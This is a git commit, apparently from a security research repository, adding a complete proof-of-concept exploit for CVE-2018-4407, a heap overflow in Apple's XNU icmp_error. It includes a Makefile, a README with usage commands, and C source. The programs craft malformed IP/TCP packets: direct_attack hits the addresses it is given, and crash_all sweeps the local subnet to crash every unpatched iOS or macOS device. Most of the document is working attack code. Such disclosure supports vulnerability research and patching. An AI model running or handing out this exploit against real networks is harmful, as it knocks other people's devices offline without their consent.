Semmle__SecurityExploits
commit 20174b297ca393757b3e776325e178afaddd5e74
Author:     Kevin Backhouse <kev@semmle.com>
AuthorDate: Sun Oct 28 16:14:09 2018 +0000
Commit:     Kevin Backhouse <kev@semmle.com>
CommitDate: Sun Oct 28 16:14:09 2018 +0000

    Exploit PoC for buffer overflow in icmp_error (CVE-2018-4407).

diff --git a/apple/darwin-xnu/icmp_error_CVE-2018-4407/.gitignore b/apple/darwin-xnu/icmp_error_CVE-2018-4407/.gitignore
new file mode 100644
index 0000000..d44f685
--- /dev/null
+++ b/apple/darwin-xnu/icmp_error_CVE-2018-4407/.gitignore
@@ -0,0 +1,3 @@
+*.o
+crash_all
+direct_attack
diff --git a/apple/darwin-xnu/icmp_error_CVE-2018-4407/Makefile b/apple/darwin-xnu/icmp_error_CVE-2018-4407/Makefile
new file mode 100644
index 0000000..11a9e0d
--- /dev/null
+++ b/apple/darwin-xnu/icmp_error_CVE-2018-4407/Makefile
@@ -0,0 +1,22 @@
+all: direct_attack crash_all
+
+direct_attack: direct_attack.o send_packet.o utils.o
+	gcc -O2 -Wall direct_attack.o send_packet.o utils.o -o direct_attack
+
+crash_all: crash_all.o utils.o
+	gcc -O2 -Wall crash_all.o send_packet.o utils.o -o crash_all
+
+direct_attack.o: direct_attack.c send_packet.h utils.h
+	gcc -O2 -Wall -c direct_attack.c
+
+crash_all.o: crash_all.c send_packet.h utils.h
+	gcc -O2 -Wall -c crash_all.c
+
+send_packet.o: send_packet.c send_packet.h utils.h
+	gcc -O2 -Wall -c send_packet.c
+
+utils.o: utils.c utils.h
+	gcc -O2 -Wall -c utils.c
+
+clean:
+	rm -f *~ *.o direct_attack crash_all
diff --git a/apple/darwin-xnu/icmp_error_CVE-2018-4407/README.md b/apple/darwin-xnu/icmp_error_CVE-2018-4407/README.md
new file mode 100644
index 0000000..5d8be12
--- /dev/null
+++ b/apple/darwin-xnu/icmp_error_CVE-2018-4407/README.md
@@ -0,0 +1,35 @@
+## Heap buffer overflow in icmp_error (CVE-2018-4407)
+
+Proof-of-concept exploit for a remotely triggerable heap buffer overflow vulnerability in iOS 11.4.1 and macOS 10.13.6. This exploit can be used to crash any vulnerable iOS or macOS device that is connected to the same network as the attacker's computer. The exploit involves sending a TCP packet with non-default options in the IP and TCP headers. Some routers refuse to deliver such packets, so the exploit might not work on some networks. In particular, most internet routers seem to drop such packets. However, it worked on every home and office network that I have tested it on.
+
+For more information about the vulnerability, see the [blog post on lgtm.com](https://lgtm.com/blog/apple_xnu_icmp_error_CVE-2018-4407).
+
+The buffer overflow is in this code [bsd/netinet/ip_icmp.c:339](https://github.com/apple/darwin-xnu/blob/0a798f6738bc1db01281fc08ae024145e84df927/bsd/netinet/ip_icmp.c#L339):
+
+```c
+m_copydata(n, 0, icmplen, (caddr_t)&icp->icmp_ip);
+```
+
+The exploit sets `icmplen == 120`, which is far too big for the destination buffer. The buffer is overwritten with garbage, so this causes the kernel to crash.
+
+## Usage
+
+The exploit code is designed to be built and run on Linux. To build:
+
+```bash
+make
+```
+
+This builds two versions of the PoC: `direct_attack` and `crash_all`. The former requires you to supply the IP addresses of the target machines, like this:
+
+```bash
+sudo ./direct_attack 192.168.0.8 192.168.0.12
+```
+
+The latter does not require you to list the IP addresses:
+
+```bash
+sudo ./crash_all
+```
+
+Use `crash_all` with care: it will crash any unpatched Apple device that is connected to the same network as you.
diff --git a/apple/darwin-xnu/icmp_error_CVE-2018-4407/crash_all.c b/apple/darwin-xnu/icmp_error_CVE-2018-4407/crash_all.c
new file mode 100644
index 0000000..5c7feeb
--- /dev/null
+++ b/apple/darwin-xnu/icmp_error_CVE-2018-4407/crash_all.c
@@ -0,0 +1,64 @@
+#include <ifaddrs.h>
+#include "send_packet.h"
+
+// Find all the network interfaces that we are attached to and send
+// out malicious packets to similar IP addresses. For example, if
+// one of our IP addresses is 192.168.0.13, then we will send malicious
+// packets to all addresses in the range 192.168.0.1-255.
+int main(int argc, char *argv[])
+{
+  struct ifaddrs *ifaddr;
+
+  // Create a raw socket for sending the malicious packets.
+  const int sock = create_raw_socket();
+  if (sock < 0) {
+    printf("Failed to create socket. Try running with sudo.\n");
+    return 1;
+  }
+
+  // Get the network interfaces that we are attached to.
+  if (getifaddrs(&ifaddr) < 0) {
+    printf("getifaddrs failed");
+    return 1;
+  }
+
+  // Loop over the network interfaces.
+  struct ifaddrs *ifa;
+  for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+    if (ifa->ifa_addr == NULL)
+      continue;
+
+    if (ifa->ifa_addr->sa_family == AF_INET) {
+      struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
+      printf("%s: %s\n", ifa->ifa_name, inet_ntoa(addr->sin_addr));
+
+      // Send out malicious packets to 253 similar IP addresses, by
+      // cycling through the final byte of the address. We skip values
+      // 0, 1, and 255 because they are not valid.
+      const uint16_t dst_port = ntohs(22);
+      const uint16_t src_port = ntohs(1234);
+      const uint32_t src = ntohl(addr->sin_addr.s_addr);
+      const uint32_t dst = src & 0xFFFFFF00;
+      size_t i;
+      for (i = 2; i < 255; i++) {
+        const int r0 = send_packet(
+          sock, htonl(src), src_port, htonl(dst | i), dst_port, 0, 0, 1, 0
+        );
+        if (r0 < 0) {
+          printf("send failed %s %ld\n", ifa->ifa_name, i);
+          break;
+        }
+      }
+    }
+  }
+
+  freeifaddrs(ifaddr);
+
+  const int r1 = close(sock);
+  if (r1 < 0) {
+    printf("could not close socket.\n");
+    return -1;
+  }
+
+  return 0;
+}
diff --git a/apple/darwin-xnu/icmp_error_CVE-2018-4407/direct_attack.c b/apple/darwin-xnu/icmp_error_CVE-2018-4407/direct_attack.c
new file mode 100644
index 0000000..ce674c3
--- /dev/null
+++ b/apple/darwin-xnu/icmp_error_CVE-2018-4407/direct_attack.c
@@ -0,0 +1,45 @@
+#include "send_packet.h"
+
+int main(int argc, char* argv[])
+{
+  if (argc <= 1) {
+    const char* progname = "a.out"; // Default program name
+    if (argc > 0) {
+      progname = argv[0];
+    }
+    printf("Usage: sudo %s <dest ip> <dest ip> ...\n", progname);
+    printf("Example:\n");
+    printf("  sudo %s 192.168.0.8 192.168.0.12\n", progname);
+    return 1;
+  }
+
+  const uint32_t src = 0; // 0net_addr(argv[1]);
+  const uint16_t dst_port = ntohs(22);
+  const uint16_t src_port = ntohs(1234);
+
+  const int sock = create_raw_socket();
+  if (sock < 0) {
+    printf("Failed to create socket. Try running with sudo.\n");
+    return 1;
+  }
+
+  int i;
+  for (i = 1; i < argc; i++) {
+    const uint32_t dst = inet_addr(argv[i]);
+    const int r0 = send_packet(sock, src, src_port, dst, dst_port, 0, 0, 1, 0);
+    if (r0 < 0) {
+      printf("send to %s failed\n", argv[i]);
+      return 1;
+    }
+  }
+
+  const int r1 = close(sock);
+  if (r1 < 0) {
+    printf("could not close socket.\n");
+    return -1;
+  }
+
+  // Data sent successfully
+  printf("Packets sent successfully\n");
+  return 0;
+}
diff --git a/apple/darwin-xnu/icmp_error_CVE-2018-4407/send_packet.c b/apple/darwin-xnu/icmp_error_CVE-2018-4407/send_packet.c
new file mode 100644
index 0000000..cb25720
--- /dev/null
+++ b/apple/darwin-xnu/icmp_error_CVE-2018-4407/send_packet.c
@@ -0,0 +1,100 @@
+#include "send_packet.h"
+
+// Create and send a TCP packet, which triggers the following callpath:
+//
+// 1. ip_input()                bsd/netinet/ip_input.c:1835
+// 2. call to ip_dooptions()    bsd/netinet/ip_input.c:2185
+// 3. ip_dooptions()            bsd/netinet/ip_input.c:3222
+// 4. goto bad                  bsd/netinet/ip_input.c:3250
+// 5. call icmp_error           bsd/netinet/ip_input.c:3495
+// 6. icmp_error()              bsd/netinet/ip_icmp.c:203
+// 7. call m_copydata()         bsd/netinet/ip_icmp.c:339
+//
+int send_packet(
+  const int sock,
+  const uint32_t src, const uint16_t src_port,  // In network byte order
+  const uint32_t dst, const uint16_t dst_port,  // In network byte order
+  const uint32_t seq, const uint32_t ack_seq,
+  const uint16_t syn, const uint16_t ack
+) {
+  char packet[1024];
+  memset(packet, 0, sizeof(packet));
+
+  struct iphdr* ip_hdr = (struct iphdr*)packet;
+  const size_t ip_hdrlen = 60; // Maximum IP header size.
+  struct tcphdr* tcp_hdr = (struct tcphdr*)(ip_hdrlen + (char*)ip_hdr);
+  const size_t tcp_hdrlen = 60; // Maximum TCP header size.
+  const char* payload = tcp_hdrlen + (char*)tcp_hdr;
+  const size_t payload_len = &packet[sizeof(packet)] - payload;
+
+  // Fill in the IP Header
+  memset(ip_hdr, 0, ip_hdrlen);
+  ip_hdr->ihl = ip_hdrlen >> 2;
+  ip_hdr->version = 4;
+  ip_hdr->tos = 0;
+  ip_hdr->tot_len = ip_hdrlen + tcp_hdrlen + payload_len;
+  ip_hdr->id = htonl (54321);  // Id of this packet
+  ip_hdr->frag_off = 0;
+  ip_hdr->ttl = 255;
+  ip_hdr->protocol = IPPROTO_TCP;
+  ip_hdr->check = 0; // Checksum will be computed later.
+  ip_hdr->saddr = src;
+  ip_hdr->daddr = dst;
+
+  unsigned char* ip_opt = sizeof(struct iphdr) + (unsigned char*)ip_hdr;
+  size_t ip_optlen = ip_hdrlen - sizeof(struct iphdr);
+  memset(ip_opt, IPOPT_NOP, ip_optlen);
+  // This assignment makes the options invalid, which will
+  // trigger the call to icmp_error() at bsd/netinet/ip_input.c:3495
+  ip_opt[ip_optlen-1] = IPOPT_EOL;
+  ip_opt[0] = IPOPT_LSRR;
+  ip_opt[1] = 3;
+  ip_opt[2] = 0; // Invalid: triggers "goto bad" at ip_input.c:3281
+
+  // TCP Header
+  memset(tcp_hdr, 0, tcp_hdrlen);
+  tcp_hdr->source = src_port;
+  tcp_hdr->dest = dst_port;
+  tcp_hdr->seq = seq;
+  tcp_hdr->ack_seq = ack_seq;
+  tcp_hdr->doff = tcp_hdrlen >> 2;
+  tcp_hdr->fin = 0;
+  tcp_hdr->syn = syn;
+  tcp_hdr->rst = 0;
+  tcp_hdr->psh = 0;
+  tcp_hdr->ack = ack;
+  tcp_hdr->urg = 0;
+  tcp_hdr->window = htons (5840); // maximum allowed window size
+  tcp_hdr->check = 0; // Checksum will be computed later
+  tcp_hdr->urg_ptr = 0;
+
+  // Compute checksums.
+  tcp_checksum(
+    ip_hdr,
+    ip_hdrlen,
+    tcp_hdr,
+    tcp_hdrlen,
+    payload,
+    payload_len
+  );
+
+  // Send the packet
+  struct sockaddr_in sin;
+  memset(&sin, 0, sizeof(sin));
+  sin.sin_family = AF_INET;
+  sin.sin_port = dst_port;
+  sin.sin_addr.s_addr = dst;
+
+  const int r0 =
+    sendto(
+      sock, packet, ip_hdr->tot_len, 0,
+      (struct sockaddr *)&sin, sizeof(sin)
+    );
+  if (r0 < 0) {
+    const int err = errno;
+    printf("send failed %d err=%d %s\n", r0, err, strerror(err));
+    return -1;
+  }
+
+  return 0;
+}
diff --git a/apple/darwin-xnu/icmp_error_CVE-2018-4407/send_packet.h b/apple/darwin-xnu/icmp_error_CVE-2018-4407/send_packet.h
new file mode 100644
index 0000000..d69b6c9
--- /dev/null
+++ b/apple/darwin-xnu/icmp_error_CVE-2018-4407/send_packet.h
@@ -0,0 +1,9 @@
+#include "utils.h"
+
+int send_packet(
+  const int sock,
+  const uint32_t src, const uint16_t src_port,  // In network byte order
+  const uint32_t dst, const uint16_t dst_port,  // In network byte order
+  const uint32_t seq, const uint32_t ack_seq,
+  const uint16_t syn, const uint16_t ack
+);
diff --git a/apple/darwin-xnu/icmp_error_CVE-2018-4407/utils.c b/apple/darwin-xnu/icmp_error_CVE-2018-4407/utils.c
new file mode 100644
index 0000000..1e438e3
--- /dev/null
+++ b/apple/darwin-xnu/icmp_error_CVE-2018-4407/utils.c
@@ -0,0 +1,178 @@
+#include "utils.h"
+
+// Compute the Internet Checksum (https://tools.ietf.org/html/rfc1071). One
+// of the particularly clever features of the Internet Checksum is its byte
+// order independence. In other words, it is not a bug that this function
+// does not contain any calls to `ntohs` or `htons`.
+uint16_t checksum(const uint16_t* buf, size_t n, const uint16_t start) {
+  // The tot_len field of an IP header is a uint16_t, so the number of
+  // bytes will never exceed the capacity of a uint16_t.
+  assert(n == (uint16_t)n);
+
+  uint32_t sum = start;
+
+  while (n > 1) {
+    sum += *buf;
+    buf++;
+    n -= 2;
+  }
+
+  if (n > 0) {
+    // Read the final byte as though there was an extra zero byte
+    // at the end of the buffer.
+    uint16_t x = 0;
+    memcpy(&x, buf, 1);
+    sum += x;
+  }
+
+  // The code below is an efficent way to compute sum `mod` 0xFFFF.
+  // It is based on this insight:
+  //
+  // 1. 0x10000 `mod` 0xFFFF == 1.
+  // 2. Therefore, (a * 0x10000 + b) `mod` 0xFFFF == (a + b) `mod` 0xFFFF.
+  sum = (sum>>16) + (sum & 0xFFFF);
+  assert(sum <= 0x1FFFE);
+  sum = sum + (sum>>16); // Add carry bit.
+
+  // Truncate to 16 bits.
+  // Note: this might return the answer 0xFFFF. 0xFFFF `mod` 0xFFFF == 0,
+  // so this means that in this case the code returns a different answer
+  // than if we had just used the % operator. But the value 0xFFFF is
+  // allowed (in fact, preferred) as an internet checksum, so this is ok.
+  return sum;
+}
+
+// Finalize the checksum by computing its complement (except if
+// the complement is zero).
+static uint16_t wrapsum(uint16_t c) {
+  // In 1's complement arithmetic, the numbers 0 and 0xFFFF are equivalent,
+  // but the number 0xFFFF is preferred over 0. So before we compute the
+  // complement, we do some bit twiddling to map 0xFFFF to 0.
+  uint32_t x = c;
+  ++x;
+  c += x >> 16;  // x >> 16 == 0, unless c == 0xFFFF.
+
+  return ~c;
+}
+
+// Used to calculate the TCP checksum.
+struct pseudo_header {
+  uint32_t source_address;
+  uint32_t dest_address;
+  uint8_t placeholder;
+  uint8_t protocol;
+  uint16_t tcp_length;
+};
+
+// Set the checksum fields in an IP header.
+void ip_checksum(
+  struct iphdr* ip_hdr,
+  const size_t ip_hdrlen
+) {
+  assert(ip_hdrlen == (uint16_t)ip_hdrlen);
+  assert((ip_hdrlen & 3) == 0);
+  assert(ip_hdr->check == 0);
+
+  // Calculate IP header checksum.
+  ip_hdr->check = wrapsum(checksum((uint16_t*)ip_hdr, ip_hdrlen, 0));
+}
+
+// Set the IP and TCP checksum fields in a TCP packet.
+void tcp_checksum(
+  struct iphdr* ip_hdr,
+  size_t ip_hdrlen,
+  struct tcphdr* tcp_hdr,
+  size_t tcp_hdrlen,
+  const char* payload,
+  size_t payload_len
+) {
+  assert(ip_hdrlen == (uint16_t)ip_hdrlen);
+  assert((ip_hdrlen & 3) == 0);
+  assert(tcp_hdrlen == (uint16_t)tcp_hdrlen);
+  assert(payload_len == (uint16_t)payload_len);
+  assert(ip_hdr->check == 0);
+  assert(tcp_hdr->check == 0);
+
+  const size_t ip_len = ip_hdrlen + tcp_hdrlen + payload_len;
+  // Note: the assertion below also checks that ip_len will not
+  // overflow a uint16_t.
+  assert(ip_len == ip_hdr->tot_len);
+
+  // Calculate IP header checksum.
+  ip_checksum(ip_hdr, ip_hdrlen);
+
+  // Create pseudo-header for TCP checksum calculation.
+  struct pseudo_header psh;
+  memset(&psh, 0, sizeof (psh));
+  psh.source_address = ip_hdr->saddr;
+  psh.dest_address = ip_hdr->daddr;
+  psh.placeholder = 0;
+  psh.protocol = IPPROTO_TCP;
+  psh.tcp_length = htons(tcp_hdrlen + payload_len);
+
+  // Calculate TCP checksum.
+  uint16_t sum = 0;
+  sum = checksum((uint16_t*)&psh, sizeof(psh), sum);
+  sum = checksum((uint16_t*)tcp_hdr, tcp_hdrlen + payload_len, sum);
+  tcp_hdr->check = wrapsum(sum);
+}
+
+int create_raw_socket() {
+  const int sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+  if (sock == -1) {
+    printf("Failed to create socket. Try running with sudo.\n");
+    return -1;
+  }
+
+  // IP_HDRINCL to tell the kernel that headers are included in the packet
+  int one = 1;
+  if (setsockopt (sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof (one)) < 0) {
+    printf("Error setting IP_HDRINCL\n");
+    return -1;
+  }
+
+  return sock;
+}
+
+// Create a TCP socket and start listening on the specified port.
+int create_socket_and_listen(uint16_t port) {
+  // Create a socket for listening on port 80.
+  const int sock = socket(PF_INET, SOCK_STREAM, 0);
+  if (sock < 0) {
+    printf("Failed to create socket. Try running with sudo.\n");
+    return -1;
+  }
+
+  // Allow the port to be reused as soon as the program terminates.
+  int one = 1;
+  const int r0 =
+    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+  if (r0 < 0) {
+    printf("Failed to set SO_REUSEADDR\n.");
+    return -1;
+  }
+
+  // Bind the port.
+  struct sockaddr_in http_addr;
+  memset(&http_addr, 0, sizeof(http_addr));
+  http_addr.sin_port = htons(port);
+  http_addr.sin_addr.s_addr = INADDR_ANY;
+
+  if (bind(sock, (struct sockaddr *)&http_addr, sizeof(http_addr)) < 0) {
+    int err = errno;
+    printf(
+      "Error binding HTTP socket. Try running with sudo.\nerrno = %d %s\n",
+      err, strerror(err)
+    );
+    return -1;
+  }
+
+  // Start listening.
+  const int r1 = listen(sock, SOMAXCONN);
+  if (r1 < 0) {
+    printf("listen failed.\n");
+    return -1;
+  }
+
+  return sock;
+}
diff --git a/apple/darwin-xnu/icmp_error_CVE-2018-4407/utils.h b/apple/darwin-xnu/icmp_error_CVE-2018-4407/utils.h
new file mode 100644
index 0000000..d575f10
--- /dev/null
+++ b/apple/darwin-xnu/icmp_error_CVE-2018-4407/utils.h
@@ -0,0 +1,29 @@
+#include <unistd.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <string.h>
+#include <stdio.h>
+#include <assert.h>
+#include <errno.h>
+
+uint16_t checksum(const uint16_t* buf, size_t n, const uint16_t start);
+
+void ip_checksum(
+  struct iphdr* ip_hdr,
+  const size_t ip_hdrlen
+);
+
+void tcp_checksum(
+  struct iphdr* ip_hdr,
+  size_t ip_hdrlen,
+  struct tcphdr* tcp_hdr,
+  size_t tcp_hdrlen,
+  const char* payload,
+  size_t payload_len
+);
+
+int create_raw_socket();
+
+int create_socket_and_listen(uint16_t port);
